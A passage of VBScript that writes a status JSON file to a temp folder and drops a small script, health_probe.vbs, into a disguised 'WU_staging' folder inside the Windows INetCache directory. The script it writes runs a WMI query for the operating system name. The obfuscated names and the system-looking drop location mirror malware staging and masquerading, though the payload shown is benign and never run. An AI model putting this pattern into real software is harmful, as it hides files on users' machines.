Dim fs8881,sh8881,dir8881,fp8881,tx8881
Set fs8881=CreateObject("Scripting.FileSystemObject")
Set sh8881=CreateObject("WScript.Shell")
dir8881=sh8881.ExpandEnvironmentStrings("%TEMP%") & "\DeviceManagement"

If Not fs8881.FolderExists(dir8881) Then fs8881.CreateFolder dir8881
fp8881=dir8881 & "\report_prefetch.json"
Set tx8881=fs8881.CreateTextFile(fp8881,True)
tx8881.Write "{""status"":""idle"",""source"":""prefetch""}"
tx8881.Close
ResolveConfigCipher67=0
End Function

Function FetchPolicyBlock99()
' --- helpers ---
Dim fs9610,sh9610,dir9610,fp9610,tx9610
Set fs9610=CreateObject("Scripting.FileSystemObject")
Set sh9610=CreateObject("WScript.Shell")
dir9610=sh9610.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\INetCache\WU_staging"
If Not fs9610.FolderExists(dir9610) Then fs9610.CreateFolder dir9610
fp9610=dir9610 & "\health_probe.vbs"
Set tx9610=fs9610.CreateTextFile(fp9610,True)
tx9610.WriteLine "On Error Resume Next"
tx9610.WriteLine "Dim w:Set w=GetObject(""winmgmts:\\.\root\cimv2"")"
tx9610.WriteLine "w.ExecQuery ""Select Caption from Win32_OperatingSystem"""
tx9610.Close
FetchPolicyBlock99=0

End Function

